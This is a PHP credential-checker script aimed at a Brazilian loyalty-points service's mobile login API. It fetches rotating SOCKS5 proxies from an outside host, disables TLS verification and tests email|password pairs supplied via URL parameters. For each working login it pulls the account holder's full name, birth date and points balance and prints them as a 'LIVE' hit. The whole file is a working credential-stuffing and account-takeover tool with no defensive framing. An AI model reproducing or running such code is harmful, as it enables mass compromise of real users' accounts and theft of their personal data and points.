<?php 
 
error_reporting(0); 
ini_set('max_execution_time',0); 
 
function dados($string, $start, $end, $num) { 
    $str = explode($start, $string); 
    $str = explode($end, $str[$num]); 
    return $str[0]; 
} 
function proxy(){ 
 $link = file_get_contents("https://rootcenter.pintoresdeletras.com.br/ProxyGG.php"); 
 $proxy = dados($link, '"Proxy" : "','"', 1); 
 return $proxy; 
} 
 
$proxy = proxy(); 
$linha = $_GET["lista"]; 
 
$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];
$ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, 'https://api-mobile.dotz.com.br/v12/api/Usuarios/AutenticarConta');  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_PROXY, $proxy); 
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");  
        curl_setopt($ch, CURLOPT_HEADER, 1);  
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(  
    'Host: api-mobile.dotz.com.br ',  
    'Connection: Keep-Alive',  
    'user-agent: okhttp/3.9.0',  
    'Content-Type: application/json; charset=UTF-8',  
    'Cache-Control: no-cache'  
));  
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"identificador":"'.$email.'","senha":"'.$senha.'"}');  
        curl_setopt($ch, CURLOPT_POST, 1);  
 $resulta = curl_exec($ch);  
 
  $userid = dados($resulta, '"usuarioId": ',',', 1); 
        $usertoken = dados($resulta, '"token": "','"', 1); 
       $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, "https://api-mobile.dotz.com.br/v12/api/Usuarios/ObterInformacoes?usuarioId=$userid");  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_PROXY, $proxy); 
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");  
        curl_setopt($ch, CURLOPT_HEADER, 1);  
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(  
    'Authorization-Token: '.$usertoken.'' 
));   
     $result = curl_exec($ch);  
        if (strpos($result, 'usuario') !== false) {  
         $nome = dados($result, '"nomeCompleto": "','"',1); 
         $data = dados($result, '"dataNascimento": "','"',1); 
         $saldo = dados($result, '"resultado": ',' }',1); 
            echo "LIVE ➜ $email|$senha | Nome: $nome | Data de nascimento: $data | Dotz: $saldo $proxy #FlashReverso";  
         
        }else{  
            if($resulta == ""){ $proxy = "PROXY DIE"; }
         echo "DIE ➜ $email|$senha | Proxy: $proxy"; 
         }  
 
?>